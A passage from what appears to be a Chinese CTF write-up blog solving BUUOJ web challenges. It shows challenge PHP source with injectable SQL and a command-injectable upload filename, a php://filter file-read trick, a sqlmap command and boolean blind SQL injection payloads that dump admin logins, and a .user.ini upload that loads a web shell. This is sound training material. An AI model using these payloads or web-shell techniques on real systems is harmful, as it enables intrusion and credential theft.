punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql_query</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql_query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">Filter</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"select * from `albert_users` where `username_which_you_do_not_know`= '<span class="token interpolation"><span class="token variable">$user</span></span>' and `password_which_you_do_not_know_too` = '<span class="token interpolation"><span class="token variable">$pass</span></span>'"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($res);</span><span class="token comment">//    die();</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span>username_which_you_do_not_know<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'login'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span>isadmin_which_you_do_not_know_too_too<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">updateadmin</span><span class="token punctuation">(</span><span class="token variable">$level</span><span class="token punctuation">,</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"update `albert_users` set `isadmin_which_you_do_not_know_too_too` = '<span class="token interpolation"><span class="token variable">$level</span></span>' where `username_which_you_do_not_know`='<span class="token interpolation"><span class="token variable">$user</span></span>' "</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($res);</span><span class="token comment">//    die();</span><span class="token comment">//    die($res);</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">Filter</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES ('<span class="token interpolation"><span class="token variable">$user</span></span>','<span class="token interpolation"><span class="token variable">$pass</span></span>','0')"</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">insert_id</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>就这样根据源码的数据…读到了以下界面</p><p><code>config.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ERROR</span> <span class="token operator">|</span> <span class="token constant">E_WARNING</span> <span class="token operator">|</span> <span class="token constant">E_PARSE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token constant">BASEDIR</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"/var/www/html/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$OPERATE</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'userinfo'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'upload'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'search'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$OPERATE_admin</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'userinfo'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'upload'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'search'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'manage'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$DBHOST</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$DBUSER</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"root"</span><span class="token punctuation">;</span><span class="token variable">$DBPASS</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"Nu1LCTF2018!@#qwe"</span><span class="token punctuation">;</span><span class="token comment">//$DBPASS = "";</span><span class="token variable">$DBNAME</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"N1CTF"</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span> <span class="token operator">=</span> @<span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$DBHOST</span><span class="token punctuation">,</span> <span class="token variable">$DBUSER</span><span class="token punctuation">,</span> <span class="token variable">$DBPASS</span><span class="token punctuation">,</span> <span class="token variable">$DBNAME</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_connect_errno</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"no sql connection"</span><span class="token punctuation">.</span><span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$mysqli</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p><code>guest.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"you can not visit it directly "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"templates/guest.html"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><code>info.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"you can not visit it directly "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"templates/info.html"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><code>ffffllllaaaaggg</code>被过滤</p><h5 id="利用-parse-url解析漏洞"><a href="#利用-parse-url解析漏洞" class="headerlink" title="利用 parse_url解析漏洞"></a>利用 <code>parse_url</code>解析漏洞</h5><p> 当url种出现下面这种情况的url，会解析错误，返回false<br><code>//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code> </p><p><code>ffffllllaaaaggg.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"you can not visit it directly"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"you can find sth in m4aaannngggeee"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p><code>m4aaannngggeee.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"you can not visit it directly"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"templates/upload.html"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>访问<code>./templates/upload.html</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129211243615.png" class="" title="image-20201129211243615" loading="lazy"><p>赶紧上传个，结果白高兴一场</p><img src="/article/Buuoj-WEB-Write-up/image-20201129211356792.png" class="" title="image-20201129211356792" loading="lazy"><p>利用user.php再读<code>upllloadddd.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$allowtype</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"gif"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"png"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$size</span> <span class="token operator">=</span> <span class="token number">10000000</span><span class="token punctuation">;</span><span class="token variable">$path</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"error:can not move"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"error:not an upload file！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$newfile</span> <span class="token operator">=</span> <span class="token variable">$path</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"file upload success&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token variable">$picdata</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">" | base64 -w 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;img src='data:image/png;base64,"</span><span class="token punctuation">.</span><span class="token variable">$picdata</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"'>&lt;/img>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'error'</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Upload file error: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token variable">$allowtype</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>访问<code>./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129212543344.png" class="" title="image-20201129212543344" loading="lazy"><p>确认存在文件上传考点，回去找上传点，访问<code>./user.php?page=m4aaannngggeee</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129212613725.png" class="" title="image-20201129212613725" loading="lazy"><p>上传发现</p><img src="/article/Buuoj-WEB-Write-up/image-20201129212720648.png" class="" title="image-20201129212720648" loading="lazy"><p>表明无法通过上传一句话木马获得shell</p><p>后来分析代码发现漏洞</p><h5 id="文件名代码执行漏洞"><a href="#文件名代码执行漏洞" class="headerlink" title="文件名代码执行漏洞"></a>文件名代码执行漏洞</h5><img src="/article/Buuoj-WEB-Write-up/image-20201129212856576.png" class="" title="image-20201129212856576" loading="lazy"><p>扫目录</p><img src="/article/Buuoj-WEB-Write-up/image-20201129213023625.png" class="" title="image-20201129213023625" loading="lazy"><p>flag即在<code>flag_233333</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129213121552.png" class="" title="image-20201129213121552" loading="lazy"><p>成功</p><hr><h2 id="Black-Watch-入群题-Web"><a href="#Black-Watch-入群题-Web" class="headerlink" title="[Black Watch 入群题]Web"></a>[Black Watch 入群题]Web</h2><p>打开</p><img src="/article/Buuoj-WEB-Write-up/image-20201202104315913.png" class="" title="image-20201202104315913" loading="lazy"><p>有登陆，尝试登陆界面sql注入</p><img src="/article/Buuoj-WEB-Write-up/image-20201202104343337.png" class="" title="image-20201202104343337" loading="lazy"><p>查看源码，在webpack发现猫腻</p><img src="/article/Buuoj-WEB-Write-up/image-20201202104718292.png" class="" title="image-20201202104718292" loading="lazy"><p>登录界面注入无果<img src="/article/Buuoj-WEB-Write-up/image-20201202104751986.png" class="" title="image-20201202104751986" loading="lazy"></p><p>转<code>content_list.php</code></p><p>发现请求文章时会带id参数，尝试注入</p><img src="/article/Buuoj-WEB-Write-up/image-20201202105153401.png" class="" title="image-20201202105153401" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201202105351447.png" class="" title="image-20201202105351447" loading="lazy"><p>确认存在注入</p><p>过滤了<code>+</code> <code>空格</code> <code>and</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201202105230126.png" class="" title="image-20201202105230126" loading="lazy"><p> 输入数据库不存在的id或产生语法时没有回显，初步判断为布尔盲注</p><h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p>写个tamper替换空格等字符</p><pre class="language-shell" data-language="shell"><code class="language-shell">python2 sqlmap.py -u <span class="token string">"http://49a772d8-a3af-40d4-89c2-eaa7bc0fb974.node3.buuoj.cn/backend/content_detail.php?id=0"</span>  --delay<span class="token operator">=</span><span class="token number">0.07</span> --dbms<span class="token operator">=</span>mysql --technique<span class="token operator">=</span>B --tamper<span class="token operator">=</span>mytamper.py --user-agent<span class="token operator">=</span><span class="token string">"chrome"</span> --risk<span class="token operator">=</span><span class="token number">3</span> --dump</code></pre><p>参数：</p><pre class="language-none"><code class="language-none">--delay 延迟注入，网站快速注入会返回429，Too Many Requirements--dbms 数据库类型--technique 注入方式，这里B指bool布尔盲注--tamper 使用的tamper--user-agent 题目判断UA--risk 风险等级--dump 数据库全部拖下来</code></pre><p>运行提示</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> GET parameter <span class="token string">'id'</span> appears to be <span class="token string">'OR boolean-based blind - WHERE or HAVING clause'</span> injectable</code></pre><p>证实为布尔盲注</p><img src="/article/Buuoj-WEB-Write-up/image-20201202110359111.png" class="" title="image-20201202110359111" loading="lazy"><p>发现跑出了数据库名<code>news</code>但跑不出表名</p><img src="/article/Buuoj-WEB-Write-up/image-20201202110529783.png" class="" title="image-20201202110529783" loading="lazy"><p>参考师傅的答案，写脚本开始跑</p><p>payload：</p><pre class="language-none"><code class="language-none">1^if((select(ascii(substr((select(database())),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#</code></pre><p>一段一段分析</p><pre class="language-none"><code class="language-none">database() : 数据库(select(database()) : 选择数据库substr函数 : 指截取参数1字符串，从参数2的位置开始截取参数3位substr((select(database())),&#123;&#125;,1) : 指从数据库名第&#123;&#125;的位置截取一位ascii(substr((select(database())),&#123;&#125;,1)) : 指转化为ASCII码值select : 如下图所示select(ascii(substr((select(database())),&#123;&#125;,1))&#x3D;&#123;&#125;) : select ascii&#x3D;&#123;&#125;，判断是否和某个ascii码值相等，如图if(a,1,0) : 相当于三目运算符 :? ,即 a:1?0^ : 异或符</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201202112853423.png" class="" title="image-20201202112853423" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201202112804610.png" class="" title="image-20201202112804610" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201202112928978.png" class="" title="image-20201202112928978" loading="lazy"><p>很明显，第一个<code>&#123;&#125;</code>指的是数据库名的第i位，第二个<code>&#123;&#125;</code>指对第i的ASCII码值进行比较</p><img src="/article/Buuoj-WEB-Write-up/image-20201202110930572.png" class="" title="image-20201202110930572" loading="lazy"><p>数据库名为<code>news</code>，继续跑表名</p><p>payload：</p><pre class="language-none"><code class="language-none">1^if((select(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;news&#39;)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201202113058557.png" class="" title="image-20201202113058557" loading="lazy"><p>再跑列名</p><p>payload：</p><pre class="language-none"><code class="language-none">1^if((select(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;admin&#39;)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201202113123832.png" class="" title="image-20201202113123832" loading="lazy"><p>跑数据了</p><p>payload：</p><pre class="language-none"><code class="language-none">1^if((select(ascii(substr((select(group_concat(id))from(admin)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#1^if((select(ascii(substr((select(group_concat(username))from(admin)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#1^if((select(ascii(substr((select(group_concat(password))from(admin)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#1^if((select(ascii(substr((select(group_concat(is_enable))from(admin)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#</code></pre><p>其实没必要跑那么多，（跑着好玩</p><p>出来表有两行</p><img src="/article/Buuoj-WEB-Write-up/image-20201202113806290.png" class="" title="image-20201202113806290" loading="lazy"><p><code>username</code>：3ab8d14c,dcaf5eed</p><img src="/article/Buuoj-WEB-Write-up/image-20201202114112390.png" class="" title="image-20201202114112390" loading="lazy"><p><code>password</code>：2a790c21,f285e92a</p><img src="/article/Buuoj-WEB-Write-up/image-20201202114324916.png" class="" title="image-20201202114324916" loading="lazy"><p><code>is_enable</code>：0,1</p><img src="/article/Buuoj-WEB-Write-up/image-20201202114435825.png" class="" title="image-20201202114435825" loading="lazy"><p>直接去拿enbale的登陆即可</p><p>表结构是这样的</p><p>数据库名:news</p><p>表名:admin</p><table><thead><tr><th>id</th><th>username</th><th>password</th><th>is_enable</th></tr></thead><tbody><tr><td>1</td><td>3ab8d14c</td><td>2a790c21</td><td>0</td></tr><tr><td>2</td><td>dcaf5eed</td><td>f285e92a</td><td>1</td></tr></tbody></table><p>登陆成功</p><img src="/article/Buuoj-WEB-Write-up/image-20201202114303580.png" class="" title="image-20201202114303580" loading="lazy"><hr><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><h5 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h5><img src="/article/Buuoj-WEB-Write-up/image-20201203151206446.png" class="" title="image-20201203151206446" loading="lazy"><p>上来很直白，传个码看看</p><img src="/article/Buuoj-WEB-Write-up/image-20201203151245517.png" class="" title="image-20201203151245517" loading="lazy"><p>改后缀</p><img src="/article/Buuoj-WEB-Write-up/image-20201203151428059.png" class="" title="image-20201203151428059" loading="lazy">文件内容还检查，加`GIF98a`可以<img src="/article/Buuoj-WEB-Write-up/image-20201203151803538.png" class="" title="image-20201203151803538" loading="lazy"><p>会返回上传文件夹目录的数组，目录穿越上传不行，php过滤死了，传含码图片，过滤<code>&lt;?</code>，而<code>&lt;%</code>也不解析，路走不通。</p><p>传个<code>.htaccess</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201203152651182.png" class="" title="image-20201203152651182" loading="lazy"><p>但是好像没解析…</p><img src="/article/Buuoj-WEB-Write-up/image-20201203152715211.png" class="" title="image-20201203152715211" loading="lazy"><p>经查询，nginx使用<code>.user.ini</code>自定义设置</p><p>于是传个<code>.user.ini</code></p><pre class="language-ini" data-language="ini"><code class="language-ini">.user.iniGIF89a                  //绕过exif_imagetype()<span class="token constant">auto_prepend_file</span><span class="token attr-value"><span class="token punctuation">=</span>gyy.jpg //指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。它包含在所有php文件前先执行</span><span class="token constant">auto_append_file</span><span class="token attr-value"><span class="token punctuation">=</span>gyy.jpg  //解析后进行包含，它包含在所有php文件执行后执行</span></code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201203161427723.png" class="" title="image-20201203161427723" loading="lazy"><p>ok,再传码</p><img src="/article/Buuoj-WEB-Write-up/image-20201203161504788.png" class="" title="image-20201203161504788" loading="lazy"><p>然后直接访问<code>index.php</code>就可以了，因为<code>.user.ini</code>里写了，提前加载了<code>gyy.jpg</code>文件，而里面是我们写好的码，shell直接连上</p><img src="/article/Buuoj-WEB-Write-up/image-20201203161829593.png" class="" title="image-20201203161829593" loading="lazy"><hr><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>记录一道特殊的题， 很简单的web题，但是需要对java容器和项目存放位置比较了解，作为web选手，应该要对几大语言的容器，项目环境，有所了解。</p><p>考点：<strong>WEB-INF/web.xml泄露</strong></p><pre class="language-none"><code class="language-none">WEB-INF主要包含一下文件或目录:&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</code></pre><img 